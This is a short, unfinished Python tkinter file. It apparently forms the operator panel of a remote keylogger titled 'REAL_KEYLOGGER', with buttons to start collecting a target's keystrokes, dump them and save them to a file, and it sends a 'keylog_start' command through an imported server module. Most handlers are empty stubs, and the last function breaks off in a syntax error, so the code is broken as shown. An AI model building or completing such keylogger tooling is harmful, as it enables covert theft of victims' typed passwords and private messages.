#!/usr/bin/python3

from tkinter import *
import tkinter.font
import server





root = Tk()
root.title("REAL_KEYLOGGER")
root.geometry("460x600")
root.config(bg = "black")

font = tkinter.font.Font(family = "Helvetica", size = 12, weight = "bold")


def start():
    server.target_communication("keylog_start")

def dump():
    pass

def save():
    pass

def quit():
    pass

button_start = Button(root, text = "START TO COLLECT THE KEYS", padx = 60, pady = 25, activebackground = "#26b78d", bg = "#26b78d", font = font, command = start)

button_dump = Button(root, text = "DUMP COLLECTED KEYSTROKES HERE", padx = 60, pady = 25, activebackground = "#26b78d", bg = "#26b78d", font = font, command = dump)

button_save = Button(root, text = "SAVE THE STROKES IN A FILE", padx = 60, pady = 25,  activebackground = "#26b78d", bg = "#26b78d", font = font, command = save)

label = Label(text = "", fg = "white", bg = "black", bd = None)

key_label = Label(text = "", bg = "grey", fg = "white", bd = 3, width = 55, height = 13, anchor = "nw")

button_start.place(x = 45, y = 5)
button_dump.place(x = 5, y = 180)
button_save.place(x = 45, y = 510)
label.place(x = 20, y = 100)
key_label.place(x = 5, y = 270)


def Handler(identifier):
    if identifier == ""

server.attachHandler(Handler)


root.mainloop()
